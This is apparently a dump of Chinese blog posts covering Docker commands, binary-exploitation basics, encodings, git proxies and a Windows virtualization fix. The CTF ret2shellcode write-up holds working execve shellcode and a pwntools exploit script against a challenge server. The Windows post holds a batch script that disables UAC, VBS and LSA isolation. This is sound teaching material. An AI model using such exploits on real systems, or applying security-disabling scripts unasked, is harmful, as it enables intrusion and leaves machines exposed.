&quot;/docker-entrypoint.…&quot; 7 minutes ago Up 6 seconds 0.0.0.0:8080-&gt;80/tcp, :::8080-&gt;80/tcp nginx1 重启容器使用命令 docker restart &#123;容器ID|容器名称&#125; 来重启容器。 进入容器使用命令 docker exec -it &#123;容器ID|容器名称&#125; /bin/sh 来进入容器，/bin/sh 是指定进入容器时用的终端，如果容器内有其他终端可以自行修改： 1234567[root@docker ~]# docker exec -it nginx1 /bin/sh# exit[root@docker ~]# docker exec -it nginx1 /bin/bashroot@4cf61416ee67:/# lsbin boot dev docker-entrypoint.d docker-entrypoint.sh etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr varroot@4cf61416ee67:/# exitexit 容器删除使用命令 docker rm &#123;容器ID|容器名称&#125; 来删除已经关闭的容器，如果容器在运行中想要强制删除可以加 -f 参数进行强制删除： 1234567[root@docker ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES4cf61416ee67 nginx &quot;/docker-entrypoint.…&quot; 15 minutes ago Up 7 minutes 0.0.0.0:8080-&gt;80/tcp, :::8080-&gt;80/tcp nginx1[root@docker ~]# docker rm -f nginx1nginx1[root@docker ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 容器日志使用命令 docker logs &#123;容器ID|容器名称&#125; 来查看容器运行时的日志： 12345678910111213141516171819[root@docker ~]# docker run -p 8081:80 -d --name myweb nginx497eff031c03927f17fe14fcff49bea832403687d580294c42f9cfba697a1564[root@docker ~]# docker logs myweb/docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration/docker-entrypoint.sh: Looking for shell scripts in /docker-entrypoint.d//docker-entrypoint.sh: Launching /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh10-listen-on-ipv6-by-default.sh: info: Getting the checksum of /etc/nginx/conf.d/default.conf10-listen-on-ipv6-by-default.sh: info: Enabled listen on IPv6 in /etc/nginx/conf.d/default.conf/docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh/docker-entrypoint.sh: Launching /docker-entrypoint.d/30-tune-worker-processes.sh/docker-entrypoint.sh: Configuration complete; ready for start up2022/05/02 05:30:57 [notice] 1#1: using the &quot;epoll&quot; event method2022/05/02 05:30:57 [notice] 1#1: nginx/1.21.62022/05/02 05:30:57 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6)2022/05/02 05:30:57 [notice] 1#1: OS: Linux 4.18.0-348.el8.0.2.x86_642022/05/02 05:30:57 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:10485762022/05/02 05:30:57 [notice] 1#1: start worker processes2022/05/02 05:30:57 [notice] 1#1: start worker process 322022/05/02 05:30:57 [notice] 1#1: start worker process 33 容器转镜像使用命令 docker commit &#123;容器ID|容器名称&#125; 镜像名称 来打包容器，如果容器在运行中可以使用 -p 参数： 1234567[root@docker ~]# docker commit -p myweb myweb:v1.0sha256:05f5efa5b56fd3d9c6d17b74ee4a3e9866095ac8cc681879dda21b9b7a968859[root@docker ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEmyweb v1.0 05f5efa5b56f 4 seconds ago 142MBnginx latest fa5269854a5e 11 days ago 142MBhello-world latest feb5d9fea6a5 7 months ago 13.3kB 容器信息使用命令 docker inspect &#123;容器ID|容器名称&#125; 来查看容器的详细信息。这里举例筛选出容器的 IP： 12345678910111213141516[root@docker ~]# docker inspect myweb|grep IP &quot;LinkLocalIPv6Address&quot;: &quot;&quot;, &quot;LinkLocalIPv6PrefixLen&quot;: 0, &quot;SecondaryIPAddresses&quot;: null, &quot;SecondaryIPv6Addresses&quot;: null, &quot;GlobalIPv6Address&quot;: &quot;&quot;, &quot;GlobalIPv6PrefixLen&quot;: 0, &quot;IPAddress&quot;: &quot;172.17.0.2&quot;, &quot;IPPrefixLen&quot;: 16, &quot;IPv6Gateway&quot;: &quot;&quot;, &quot;IPAMConfig&quot;: null, &quot;IPAddress&quot;: &quot;172.17.0.2&quot;, &quot;IPPrefixLen&quot;: 16, &quot;IPv6Gateway&quot;: &quot;&quot;, &quot;GlobalIPv6Address&quot;: &quot;&quot;, &quot;GlobalIPv6PrefixLen&quot;: 0,","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"http://example.com/tags/docker/"}]},{"title":"PWN-shellcode","slug":"PWN-shellcode","date":"2025-06-03T11:56:27.000Z","updated":"2025-06-09T10:24:42.003Z","comments":true,"path":"2025/06/03/PWN-shellcode/","permalink":"http://example.com/2025/06/03/PWN-shellcode/","excerpt":"PWN-shellcode在开始之前呢首先我们先了解一下编译器开启的一些保护措施 一、PIEPIE（Position Independent Executable） 是现代操作系统中用于提升安全性的一个关键机制。它允许可执行文件在运行时被加载到内存中的任意地址，而不是一个固定的地址，从而配合 ASLR（Address Space Layout Randomization） 进行地址空间的随机化，防止攻击者预测代码地址。","text":"PWN-shellcode在开始之前呢首先我们先了解一下编译器开启的一些保护措施 一、PIEPIE（Position Independent Executable） 是现代操作系统中用于提升安全性的一个关键机制。它允许可执行文件在运行时被加载到内存中的任意地址，而不是一个固定的地址，从而配合 ASLR（Address Space Layout Randomization） 进行地址空间的随机化，防止攻击者预测代码地址。 什么是 PIE？PIE（Position Independent Executable，位置无关可执行文件）是一种编译方式，使得整个程序（包括代码段和数据段）都支持位置无关（Position Independent Code, PIC）。PIE 程序在加载时可以被映射到内存中的任意地址。 为什么需要 PIE？PIE 是为了支持 ASLR。如果程序是固定地址加载，即使系统启用了 ASLR，也无法随机化主程序的加载地址，攻击者可以轻易定位到关键代码位置。 PIE 和 PIC 的区别 特性 PIC PIE 应用 通常用于共享库（.so） 用于整个可执行文件 是否独立执行 否（依附主程序） 是（本身是一个独立程序） 支持ASLR 否（主程序不支持） 是（主程序支持） PIE 的工作原理 PIE 编译时生成的是 位置无关代码（通过寄存器偏移访问全局数据、函数指针等），与共享库相似。 加载器可以将 PIE 可执行文件映射到随机的内存地址。 所有符号引用通过基址加偏移的方式计算地址，而非固定地址。 如何启用和识别 PIE编译启用 PIE 在使用 gcc 或 clang 时，加上以下参数： 1gcc -fPIE -pie main.c -o main PIE 的优点与缺点优点： 支持 ASLR，增强安全性，降低 Exploit 的可靠性。 防止 ROP（Return Oriented Programming）攻击中 gadget 地址的硬编码。 缺点： 运行时性能稍有下降（需要计算偏移地址）。 编译和链接略复杂（需要处理基地址偏移等问题）。 即使编译的时候开启了PIE而操作系统没有开启ASLR那么PIE是无效的 因为PIE是基于ASLR实现的 二、NXNX保护（No eXecute &#x2F; 数据不可执行） 是现代操作系统中的一项关键内存安全保护机制，用于防止恶意代码执行。它主要通过标记内存页是否允许执行来阻止 缓冲区溢出 和 Shellcode 注入攻击。 什么是 NX 保护？NX（No eXecute），也叫 DEP（Data Execution Prevention），是一种内存页访问权限控制技术。其核心思想是： 只允许代码段执行，禁止数据段执行。 攻击者常常通过缓冲区溢出将 Shellcode 注入堆栈、堆中，如果这些内存区域标记为不可执行，则注入的代码就无法被 CPU 执行，从而阻止了漏洞利用。 在编译时启用 NX通常，现代编译器默认会生成 NX 支持的可执行文件。如果你使用的是较老的系统或手动编译，建议添加以下编译器参数： 1gcc -z noexecstack main.c -o main 三、绕过 NX 的常见方法（供防御者理解）虽然 NX 能阻止代码注入执行，但无法防止地址复用。攻击者常用以下技巧绕过 NX： 绕过方式 说明 ROP（Return Oriented Programming） 利用已有的代码片段（gadget）拼装攻击链 ret2libc 重定向控制流执行 libc 中的 system(&quot;/bin/sh&quot;) JIT Spraying 针对浏览器 JIT 编译器进行攻击，构造可执行段 mprotect&#x2F;mmap 执行页改写 利用已知函数改变页权限使数据可执行（需泄漏地址） 因此，实际防护中应配合 ASLR、Stack Canary、RELRO 等机制一起使用。 三、Canary 的工作机制栈帧布局改变（有 Canary 时）以 x86 为例，函数栈帧布局： 1234567sql复制编辑+---------------------+| 返回地址 | ← old EBP+---------------------+| Canary（金丝雀） |+---------------------+| 局部变量/缓冲区等 |+---------------------+ 运行流程 函数调用时：编译器插入代码生成随机的 Canary 值并压入栈中。 函数返回前：编译器插入代码检测栈上的 Canary 值是否被修改。 若值被篡改：说明存在栈溢出攻击，程序触发 __stack_chk_fail()，立刻终止运行。 Canary 的类型GCC 实现中，常见的 Canary 类型有三种： 类型 特点 Terminator Canary 包含不可打印字符（如 0x00、0x0D、0x0A），防止 strcpy() 等函数覆盖它 Random Canary 每次程序运行时随机生成，攻击者很难猜到其值 TLS-based Canary 每线程独立一个 Canary，提高多线程程序的安全性 编译启用 Canary GCC 编译选项 参数 说明 -fstack-protector 保护包含数组等变量的函数 -fstack-protector-strong 保护更多函数（推荐） -fstack-protector-all 所有函数都启用 Canary 1gcc -fstack-protector-strong -o main main.c Canary 绕过难点与攻击方式虽然 Canary 提高了安全性，但理论上不是绝对不可绕过的。常见绕过方式包括： 绕过方法 原理 信息泄露 通过漏洞泄露 Canary 的值，再构造 Payload 非溢出攻击 使用 UAF、格式化字符串、Heap 攻击等绕过 Canary 不破坏 Canary 的攻击 比如 ROP，不需要覆盖返回地址或覆盖前先保留 Canary 覆盖结构体指针 Canary 只保护返回地址，不保护所有栈数据 Canary 的局限性 局限点 描述 只检测返回地址破坏 无法防止其他类型的数据破坏 信息泄露可被绕过 一旦泄漏 Canary 值，保护失效 性能影响（极小） 每个函数都多一次 Canary 检查（几乎忽略不计） 那么shellcode是什么？shellcode 其实就是一小段代码 可以用于软件漏洞利用的载荷 被称为 shellcode 是因为它通常启动一个命令终端 攻击者可以通过这个终端控制受害的计算机 但是所有执行类似任务的代码片段都可以称作shellcode Shellcode通常是以机器码形式编写的 在Pwntools中 内置了一些shellcode与编译方式 只需要使用以下方式就可以调用 1print(shellcraft.amd64.sh()) 输出如下所示 1234567891011121314151617181920212223└─[$]&gt; /usr/bin/python3 /home/pwn/桌面/pwn/山化课程/day02-ret2shellcode/testshellcode.py /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */ /* push b&#x27;/bin///sh\\x00&#x27; */ push 0x68 mov rax, 0x732f2f2f6e69622f push rax mov rdi, rsp /* push argument array [&#x27;sh\\x00&#x27;] */ /* push b&#x27;sh\\x00&#x27; */ push 0x1010101 ^ 0x6873 xor dword ptr [rsp], 0x1010101 xor esi, esi /* 0 */ push rsi /* null terminate */ push 8 pop rsi add rsi, rsp push rsi /* &#x27;sh\\x00&#x27; */ mov rsi, rsp xor edx, edx /* 0 */ /* call execve() */ push SYS_execve /* 0x3b */ pop rax syscall 套用asm函数 就可以得到对应的shellcode 但是注意在调用前需要设置架构 12context.arch = &#x27;amd64&#x27;print(asm(shellcraft.amd64.sh())) 输出如下所示 1b&#x27;jhH\\xb8/bin///sPH\\x89\\xe7hri\\x01\\x01\\x814$\\x01\\x01\\x01\\x011\\xf6Vj\\x08^H\\x01\\xe6VH\\x89\\xe61\\xd2j;X\\x0f\\x05&#x27; ret2shellcode 即控制程序执行shellcode代码 shellcode指的是用于完成某个功能的汇编代码 常见的功能主要是获取目标系统的shell 一般来说shellcode需要我们自已填充 这其实是另外一种典型的利用方法 即此时我们需要自已去填充一些可执行的代码 这种手法不需要程序内部具有system之类的函数 在最早的时候十分常见 在栈溢出的基础上 要想执行shellcode 需要对应的binary在运行时 shellcode所在的区域具有可执行权限 第一种利用方式 根据函数调用约定 在一个函数执行的最后是一个 leave ret 实质是 mov esp,ebp pop ebp pop eip 这时候我们在填充一个shellcode 然后控制返回地址为 jmp esp 即可利用 例题使用checksec查保护 1checksec --file=b0verfl0w 1234─[$]&gt; checksec --file=b0verfl0wRELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEPartial RELRO No canary found NX disabled No PIE No RPATH No RUNPATH 74 Symbols No 0 2b0verfl0w 未开启任何保护 1234567891011121314int vul()&#123; char s[32]; // [esp+18h] [ebp-20h] BYREF puts(&quot;\\n======================&quot;); puts(&quot;\\nWelcome to X-CTF 2016!&quot;); puts(&quot;\\n======================&quot;); puts(&quot;What&#x27;s your name?&quot;); fflush(stdout); fgets(s, 50, stdin); printf(&quot;Hello %s.&quot;, s); fflush(stdout); return 1;&#125; 这是函数的主函数 经过分析之后发现并没有 bin/sh 所以我们可以想到的是用shellcode 毕竟没有开启NX保护 定位泄露位置可以通过ida计算 12345678910111213141516171819202122232425262728293031323334-0000000000000020 char s;-000000000000001F // padding byte-000000000000001E // padding byte-000000000000001D // padding byte-000000000000001C // padding byte-000000000000001B // padding byte-000000000000001A // padding byte-0000000000000019 // padding byte-0000000000000018 // padding byte-0000000000000017 // padding byte-0000000000000016 // padding byte-0000000000000015 // padding byte-0000000000000014 // padding byte-0000000000000013 // padding byte-0000000000000012 // padding byte-0000000000000011 // padding byte-0000000000000010 // padding byte-000000000000000F // padding byte-000000000000000E // padding byte-000000000000000D // padding byte-000000000000000C // padding byte-000000000000000B // padding byte-000000000000000A // padding byte-0000000000000009 // padding byte-0000000000000008 // padding byte-0000000000000007 // padding byte-0000000000000006 // padding byte-0000000000000005 // padding byte-0000000000000004 // padding byte-0000000000000003 // padding byte-0000000000000002 // padding byte-0000000000000001 // padding byte+0000000000000000 _DWORD __saved_registers;+0000000000000004 _UNKNOWN *__return_address; s -&gt; return 是 0x20 + 4 &#x3D; 32+4 &#x3D; 36 但是呢 这道题比较特殊 因为他限制了输入的字符 fgets(s, 50, stdin); 只能输入50个字符 但是pwntools生成的shellcode字符数过于庞大 且会被截断 所以我们要换个思路 首先 我们是否可以通过 ret的特性(ret = jmp esp add esp,4)来进行移植跳转呢 原理就是通过想栈上直接写shellcode 然后再通过 jmp esp的方式去跳转到shellcode的头呢 这样是可行的 我们开始构造 首先我们需要自已编写一个shellcode 如下所示 123456789101112131415; global _start; _start:; xor eax,eax ;//eax置0; xor edx,edx ;//edx置0; push edx; push sh; push bin ;//将/bin/sh入栈; mov ebx,esp ;//ebx指向/bin/sh这个字符串; xor ecx,ecx; mov al,0Bh ;//eax置为execve函数的中断号; int 80h ;//调用软中断; section .data; sh: db &#x27;/sh&#x27;; bin:db &#x27;/bin&#x27; 或者自已去shellcode网站下载一段shellcode 紧接着我们还得计算出这段shllcode的长度 因为我们要把剩下的字节给补成垃圾数据 然后我们现在需要的就是一个 jmp esp的地址 之后我们就让 ret 处让他 jmp_esp 用 ropper 搜索即可 123456789101112131415161718(Pwn-py312) (base) cccccchow@Chow:~/pwn/AAA/山化课程/day02-ret2shellcode$ ropper(ropper)&gt; file b0verfl0w[INFO] Load gadgets from cache[LOAD] loading... 100%[LOAD] removing double gadgets... 100%[INFO] File loaded.(b0verfl0w/ELF/x86)&gt; jmp espJMP Instructions================0x08048504: jmp esp; 1 gadgets found(b0verfl0w/ELF/x86)&gt; 或者用ROPgadget搜索也可以 1ROPgadget --binary b0verfl0w --only &quot;jmp&quot; 12345670x080483ab : jmp 0x80483900x080484f2 : jmp 0x80484700x08048611 : jmp 0x80486200x0804855d : jmp dword ptr [ecx + 0x804a040]0x08048550 : jmp dword ptr [ecx + 0x804a060]0x0804876f : jmp dword ptr [ecx]0x08048504 : jmp esp 0x08048504 就找到了我们的地址 跳转到 esp之后我们还得构造一个东西 那就是 让esp指向shellcode的头部 首先我们计算 12345678910111213141516171819202122232425262728293031323334-0000000000000020 char s;-000000000000001F // padding byte-000000000000001E // padding byte-000000000000001D // padding byte-000000000000001C // padding byte-000000000000001B // padding byte-000000000000001A // padding byte-0000000000000019 // padding byte-0000000000000018 // padding byte-0000000000000017 // padding byte-0000000000000016 // padding byte-0000000000000015 // padding byte-0000000000000014 // padding byte-0000000000000013 // padding byte-0000000000000012 // padding byte-0000000000000011 // padding byte-0000000000000010 // padding byte-000000000000000F // padding byte-000000000000000E // padding byte-000000000000000D // padding byte-000000000000000C // padding byte-000000000000000B // padding byte-000000000000000A // padding byte-0000000000000009 // padding byte-0000000000000008 // padding byte-0000000000000007 // padding byte-0000000000000006 // padding byte-0000000000000005 // padding byte-0000000000000004 // padding byte-0000000000000003 // padding byte-0000000000000002 // padding byte-0000000000000001 // padding byte+0000000000000000 _DWORD __saved_registers;+0000000000000004 _UNKNOWN *__return_address; 从 __return_address 到 s 是24个字节 但是我们中间还加了一个 jmp esp 这又占 四个字节 所以我们需要写成这样 sub esp,0x28; jmp esp 这样才对 之后我们的payload就构造完成了 脚本如下： 12345678910111213141516171819202122232425262728293031323334353637from pwn import*# p = process(&quot;b0verfl0w&quot;)p = remote(&quot;node5.buuoj.cn&quot;,28176)shellcode = b&quot;\\x31\\xc0\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xb0\\x0b\\xcd\\x80&quot;shellcode_len = len(shellcode) # shellcode_len = 23print(shellcode_len)jmp_esp = 0x08048504sub_esp_jmp = asm(&#x27;sub esp,0x28;jmp esp&#x27;)# 0: 83 ec 28 sub $0x28,%esp# 3: ff e4 jmp *%espprint(sub_esp_jmp)sub_len = len(sub_esp_jmp)payload = shellcode #往栈上写shellcode#补填字节到溢出点 溢出点 = 36 应该是补填了 36-23 = 13payload += (0x24-shellcode_len) * b&#x27;a&#x27;#根据 ret的特性 首先是先jmp esp 之后 add esp,4 我们可以让他先执行完 add esp,4 然后进行jmp esppayload += p32(jmp_esp)#跳回栈顶payload += sub_esp_jmpp.sendline(payload)p.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"凯撒密码解析","slug":"凯撒密码解析","date":"2025-06-03T05:40:06.000Z","updated":"2025-06-06T04:53:42.760Z","comments":true,"path":"2025/06/03/凯撒密码解析/","permalink":"http://example.com/2025/06/03/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81%E8%A7%A3%E6%9E%90/","excerpt":"加密方法把明文中所有字母都在字母表上向后或者向前按照一个固定数目进行偏移后被替换成密文","text":"加密方法把明文中所有字母都在字母表上向后或者向前按照一个固定数目进行偏移后被替换成密文 代码实现","categories":[],"tags":[{"name":"凯撒密码","slug":"凯撒密码","permalink":"http://example.com/tags/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81/"}]},{"title":"BASE编码解析","slug":"BASE编码解析","date":"2025-06-03T05:17:26.000Z","updated":"2025-06-03T05:44:49.114Z","comments":true,"path":"2025/06/03/BASE编码解析/","permalink":"http://example.com/2025/06/03/BASE%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90/","excerpt":"BASE系列编码 先将待编码字符按照ASCII编码转换成8bit二进制形式 再将二进制序列切片组合，重组为若干个等长的二进制组 将每个二进制组转换成十进制数字，并查表找到对应的可打印ASCII字符 重组若不足则补0 并将其编码为‘&#x3D;’","text":"BASE系列编码 先将待编码字符按照ASCII编码转换成8bit二进制形式 再将二进制序列切片组合，重组为若干个等长的二进制组 将每个二进制组转换成十进制数字，并查表找到对应的可打印ASCII字符 重组若不足则补0 并将其编码为‘&#x3D;’ 根据分组长度的不同 (4bit、5bit、6bit) 可以分为三种BASE编码形式 4bit base16编码 字母表为 0123456789ABCDEF 5bit base32编码 字母表为 A-Z 2-7 6bit base64编码 字母表为 A-Z a-z 0-9 +&#x2F; 示例如下所示","categories":[],"tags":[{"name":"编码","slug":"编码","permalink":"http://example.com/tags/%E7%BC%96%E7%A0%81/"}]},{"title":"git设置代理","slug":"git设置代理","date":"2025-05-31T12:30:17.000Z","updated":"2025-05-31T12:34:15.237Z","comments":true,"path":"2025/05/31/git设置代理/","permalink":"http://example.com/2025/05/31/git%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/","excerpt":"临时设置打开 Git Bash，使用命令临时设定socks代理: 123git config --global http.proxy &#x27;socks5://127.0.0.1:socks5端口号&#x27; git config --global https.proxy &#x27;socks5://127.0.0.1:socks5端口号&#x27;","text":"临时设置打开 Git Bash，使用命令临时设定socks代理: 123git config --global http.proxy &#x27;socks5://127.0.0.1:socks5端口号&#x27; git config --global https.proxy &#x27;socks5://127.0.0.1:socks5端口号&#x27; 或者http代理： 123git config --global http.proxy &#x27;http://127.0.0.1:http端口号&#x27; git config --global https.proxy &#x27;https://127.0.0.1:https端口号&#x27; 永久设置若想要设置代理永久生效，则可以把它写入 .gitconfig 文件中。 使用 vi 打开 .gitconfig 文件： 1vi ~/.gitconfig 写入下列配置(建议在最末写入)： 123456789[http] proxy = socks5://127.0.0.1:socks5端口号proxy = http://127.0.0.1:http端口号 [https] proxy = socks5://127.0.0.1:socks5端口号proxy = https://127.0.0.1:http端口号 修改后重启 git ，使配置生效： 1git config -l --global 查看当前代理： 1git config -l 可以看到自己所配置的端口信息，则说明配置成功。 原文链接：https://blog.csdn.net/m0_57567093/article/details/127455214","categories":[],"tags":[]},{"title":"关于CheatEngine提示DBVM无法启动以及VMware提示此平台不支持虚拟化的解决方案","slug":"关于CheatEngine提示DBVM无法启动以及VMware提示此平台不支持虚拟化的解决方案","date":"2025-05-31T12:19:17.000Z","updated":"2025-05-31T12:51:02.438Z","comments":true,"path":"2025/05/31/关于CheatEngine提示DBVM无法启动以及VMware提示此平台不支持虚拟化的解决方案/","permalink":"http://example.com/2025/05/31/%E5%85%B3%E4%BA%8ECheatEngine%E6%8F%90%E7%A4%BADBVM%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BB%A5%E5%8F%8AVMware%E6%8F%90%E7%A4%BA%E6%AD%A4%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%94%AF%E6%8C%81%E8%99%9A%E6%8B%9F%E5%8C%96%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/","excerpt":"环境 windows11 24h2 其它系统应该是通用 步骤1 首先打开控制面板-程序-启动或关闭Windows功能 像这样关闭这些: 然后再找到服务禁用以下功能","text":"环境 windows11 24h2 其它系统应该是通用 步骤1 首先打开控制面板-程序-启动或关闭Windows功能 像这样关闭这些: 然后再找到服务禁用以下功能 之后再设置里面搜索内核隔离然后把内核隔离的所有选项关闭 重启电脑尝试即可 若还是不行请看步骤2 步骤2 [来自](VMware Workstation：如何解决打开虚拟机出现“此平台不支持虚拟化的Intel VT-x&#x2F;EPT”的报错问题 - VM技术库)运行msinfo32.exe命令，确认Windows 11的宿主机是否开启了VBS，如果”基于虚拟化的安全“那一行后面显示是“未启用”，本文内容不适合。如果显示“正在运行”，请继续第2步。 之后执行以下脚本 写出一个bat文件即可 记得要管理员运行 1234567891011121314151617181920212223242526272829303132333435363738@echo offdism /Online /Disable-Feature:microsoft-hyper-v-all /NoRestartdism /Online /Disable-Feature:IsolatedUserMode /NoRestartdism /Online /Disable-Feature:Microsoft-Hyper-V-Hypervisor /NoRestartdism /Online /Disable-Feature:Microsoft-Hyper-V-Online /NoRestartdism /Online /Disable-Feature:HypervisorPlatform /NoRestartREM ===========================================mountvol X: /scopy %WINDIR%\\System32\\SecConfig.efi X:\\EFI\\Microsoft\\Boot\\SecConfig.efi /Ybcdedit /create &#123;0cb3b571-2f2e-4343-a879-d86a476d7215&#125; /d &quot;DebugTool&quot; /application osloaderbcdedit /set &#123;0cb3b571-2f2e-4343-a879-d86a476d7215&#125; path &quot;\\EFI\\Microsoft\\Boot\\SecConfig.efi&quot;bcdedit /set &#123;bootmgr&#125; bootsequence &#123;0cb3b571-2f2e-4343-a879-d86a476d7215&#125;bcdedit /set &#123;0cb3b571-2f2e-4343-a879-d86a476d7215&#125; loadoptions DISABLE-LSA-ISO,DISABLE-VBSbcdedit /set &#123;0cb3b571-2f2e-4343-a879-d86a476d7215&#125; device partition=X:mountvol X: /dbcdedit /set hypervisorlaunchtype offREG DELETE HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard /v EnableVirtualizationBasedSecurity /fecho 关闭UAC通知reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System&quot; /f /v &quot;EnableLUA&quot; /t REG_DWORD /d 0reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Security Center&quot; /f /v &quot;UacDisableNotify&quot; /t REG_DWORD /d 1echo.echo.echo.echo.echo 接下来！重新启动您的电脑！完成剩下的操作。echo 请注意！重启时的屏幕提示！echo 请重启！过了BIos自检之后！看到黑白字符提示你按键的时候echo 请死按，狂按 F3键，自动重启为止！!echo 可以关闭此窗口了，重启电脑吧。。。pause &gt; nulecho.echo. 这样就是成功了 亲测有效 脚本没问题 本人也是被这个问题困扰了很久很久","categories":[],"tags":[]},{"title":"PWN-简单栈溢出","slug":"PWN-简单栈溢出","date":"2025-05-30T06:58:02.000Z","updated":"2025-06-06T04:58:05.208Z","comments":true,"path":"2025/05/30/PWN-简单栈溢出/","permalink":"http://example.com/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/","excerpt":"PWN-简单栈溢出介绍pwn这门课程简单来说就是通过二进制的形式去找到某台服务器存在哪些漏洞 与web不同的是他大部分的知识都是基于汇编组成的 在 CTF-Wiki 里面的介绍则是这样的: 栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是： 程序必须向栈上写入数据。 写入的数据大小没有被良好地控制。","text":"PWN-简单栈溢出介绍pwn这门课程简单来说就是通过二进制的形式去找到某台服务器存在哪些漏洞 与web不同的是他大部分的知识都是基于汇编组成的 在 CTF-Wiki 里面的介绍则是这样的: 栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是： 程序必须向栈上写入数据。 写入的数据大小没有被良好地控制。 则 栈的介绍如下： 基本栈介绍 ¶ 栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，如下图所示（维基百科）。两种操作都操作栈顶，当然，它也有栈底。 高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，程序的栈是从进程地址空间的高地址向低地址增长的。 这些是简单的栈介绍 首先 栈是一种特殊的数据结构 他存储了 function runtime 的参数、变量和返回地址他在一次函数调用中是不可或缺的重要部分，其中软件的架构又分为两种 x86 和 x64 这两种在参数和变量的在栈存储形式上有些不同 例如 x86 的所有参数通过 栈 从右到左依次压入 可用以下代码作为示例 使用 visual stdio 编译 x86 版本观查栈 123456789101112131415#include &lt;iostream&gt;int func(int _param1, int _param2, int _param3, int _param4, int _param5) &#123; return _param1 + _param2 + _param3 + _param4 + _param5;&#125;int main()&#123; func(1, 2, 3, 4, 5); std::cout &lt;&lt; &quot;helloworld\\n&quot;; getchar();&#125; 如图所示 我们定位到了 main 函数 然后我们在 func 处下断点 我们让他继续执行到func 执行到 call的时候我们观察栈的变化 如图所示 这是一个从低地址到高地址的显示方式 但是在入栈的时候 他是 从高地址到低地址从右往左参数依次入栈 然后我们进入call继续查看 进入call的同时我们发现 他先是压入了一个地址 这个地址就是 call 所在地址 + 5 的字节 所以call xxxxxxxx就等效于 push eip + 5 call的机器码占用一个字节 然而地址占用4个字节 其次又跳转到了 后面的地址处 所以call指令做了两件事 先是压入一个返回地址 接着又是进行了一次 jmp 跳转 然后我们接着看 在跳转过来的函数头部我们发现了两条指令 push ebp mov ebp esp 那么这是什么意思呢？ 其实是 典型的 x86 函数栈帧初始化 首先将当前的 ebp 寄存器的值压入栈 也就是保存上个函数的栈底地址 (push ebp) 之后把上个函数的栈顶作为当前函数的栈底 (mov ebp esp) 之后就是进行一系类的加法操作 到了 pop ebp的时候 就要销毁此栈帧恢复上一个函数的栈帧了 然而我们可以发现 函数参数是通过 ebp + n*4 的方式进行访问的 这很关键 直到执行到 ret 我们会发现 他的效果就等于 jmp esp &amp; add esp,4 为什么这么说 我们接着分析栈 我们可以发现现在 esp=ebp 为什么说 ret 是 jmp [esp]呢 因为我们执行完 pop ebp 他就变成了这样 也就是返回到刚才call保存的返回值了 接着我们来看下x64的栈 x64分为两种编译器 在 Linux、FreeBSD、macOS 中普遍使用 System V AMD64 ABI 前六个整型或指针参数依次保存在 RDI, RSI, RDX, RCX, R8 和 R9 寄存器中，如果还有更多的参数的话才会保存在栈上。 内存地址不能大于 0x00007FFFFFFFFFFF，6 个字节长度，否则会抛出异常。 但在Windows上是 Microsoft x64 calling convention 也称作： Windows x64 ABI Windows x64 调用约定 他的参数入栈形式如下 前四个整型或指针参数依次保存在 RCX, RDX, R8, R9，如果还有更多的参数的话才会保存在栈上。 内存地址不能大于 0x00007FFFFFFFFFFF，6 个字节长度，否则会抛出异常。 🔍 System V AMD64 ABI vs Microsoft x64 ABI 对比 特性 System V AMD64 ABI (Linux&#x2F;macOS) Microsoft x64 ABI (Windows x64) 参数传递寄存器 RDI, RSI, RDX, RCX, R8, R9 RCX, RDX, R8, R9 返回值 RAX RAX 栈空间 被调用者必须保留 red zone（128 字节） 无 red zone（不能用栈下方空间） 调用者保存（volatile）寄存器 RAX, RCX, RDX, RSI, RDI, R8–R11 RAX, RCX, RDX, R8–R11 被调用者保存（callee-saved） RBX, RBP, R12–R15 RBX, RBP, RDI, RSI, R12–R15 参数超过寄存器 从第 7 个参数起压栈 从第 5 个参数起压栈 栈对齐要求 16 字节 16 字节 